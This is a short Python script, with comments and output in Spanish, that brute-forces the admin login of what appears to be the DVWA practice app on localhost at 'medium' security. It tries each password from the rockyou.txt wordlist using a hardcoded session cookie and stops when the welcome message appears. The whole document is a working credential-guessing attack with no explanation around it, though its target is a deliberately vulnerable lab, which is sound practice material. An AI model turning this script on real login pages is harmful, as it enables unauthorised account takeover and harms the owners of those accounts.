import requests
import time

url = "http://localhost:8080/vulnerabilities/brute/"
user = "admin"

cookies = {
    'PHPSESSID' : '0160ecvj6lnpkc4ttn6t2rvi17',
    'security' : 'medium'
}

diccionario_path = 'rockyou.txt'

with open(diccionario_path, 'r', encoding='latin-1') as file:
    for line in file:
        start = time.time()
        pwd = line.strip()  # Quitamos saltos de línea
        if not pwd:
            continue

        params = {
            'username' : user,
            'password' : pwd, 
            'Login' : 'Login'
        }

        response = requests.get(url, params=params, cookies=cookies)

        duration = time.time() - start

        if "Welcome to the password protected area" in response.text:
            print(f"[+] Password encontrada: {pwd}")
            break
        else:
            print(f"[-] Intento fallido: {pwd} (tiempo: {round(duration, 2)}s.)")
